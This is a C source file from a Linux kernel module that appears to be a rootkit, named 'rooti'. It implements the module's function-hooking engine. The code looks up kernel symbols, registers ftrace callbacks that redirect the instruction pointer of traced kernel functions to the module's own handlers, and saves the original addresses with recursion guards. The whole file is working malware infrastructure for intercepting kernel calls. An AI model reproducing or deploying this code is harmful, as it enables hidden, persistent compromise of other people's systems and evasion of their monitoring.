#include <linux/list.h>
#include "hooking.h"
#include "utils.h"

LIST_HEAD(rooti_active_hooks);

/*
    Saves a reference to the original function we hook. If the recursion protection mechanism in use
    dictates that the call to ftrace callback should be skipped, then the offset is added to the
    memory address of the function, skipping the instruction for calling ftrace.
*/
static void rooti_store_original_func(struct rooti_func_hook *hook)
{
#ifdef ROOTI_USE_FENTRY_OFFSET
    // Skip over the ftrace call when called from this module - recursion protection mechanism
    *((unsigned long *)hook->orig) = hook->addr + MCOUNT_INSN_SIZE;
#else
    *((unsigned long *)hook->orig) = hook->addr;
#endif
}

/*
    Callback function for registered traced function. This callback will set the IP register
    (in the context of the traced function) to the memory address of our function, effectively
    hooking the call.
*/
static void notrace rooti_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                       struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    struct rooti_func_hook *hook = container_of(ops, struct rooti_func_hook, ops);

#ifdef ROOTI_USE_FENTRY_OFFSET
    regs->regs.ip = (unsigned long)hook->func;
#else
    // Only point to the hook function if called from outside and not from the hook function,
    // which is local to this module (recursion protection mechanism)
    if(!within_module(parent_ip, THIS_MODULE)) {
        regs->regs.ip = (unsigned long)hook->func;
    }
#endif
}

int rooti_install_func_hook(struct rooti_func_hook *hook)
{
    int err;

    // Hooking by address directly instead of looking up symbol
    // by name is possible by passing null as the symbol name
    if (hook->name != NULL) {
        hook->addr = __kallsyms_lookup_name(hook->name);
        if (hook->addr == 0) {
            ROOTI_DEBUG("unresolved symbol: %s", hook->name);
            return -ENOENT;
        }
    }

    rooti_store_original_func(hook);

    hook->ops.func = rooti_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
    if (err) {
        ROOTI_DEBUG("ftrace_set_filter_ip() failed: %d", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        ROOTI_DEBUG("register_ftrace_function() failed: %d", err);
        return err;
    }

    INIT_LIST_HEAD(&hook->list);
    list_add_tail(&hook->list, &rooti_active_hooks);

    return 0;
}

void rooti_uninstall_func_hook(struct rooti_func_hook *hook)
{
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err) {
        ROOTI_DEBUG("unregister_ftrace_function() failed: %d", err);
        return;
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
    if (err)
        ROOTI_DEBUG("ftrace_set_filter_ip() failed: %d", err);

    list_del(&hook->list);
}

int rooti_install_func_hooks(struct rooti_func_hook *hooks, size_t count)
{
    int err;
    int i;

    for (i = 0; i < count; i++) {
        err = rooti_install_func_hook(&hooks[i]);
        if (err) {
            goto error;
        }
    }
    return 0;

error:
    while (i > 0) {
        rooti_uninstall_func_hook(&hooks[--i]);
    }
    return err;
}

void rooti_uninstall_func_hooks(struct rooti_func_hook *hooks, size_t count)
{
    for (int i = 0; i < count; i++) {
        rooti_uninstall_func_hook(&hooks[i]);
    }
}
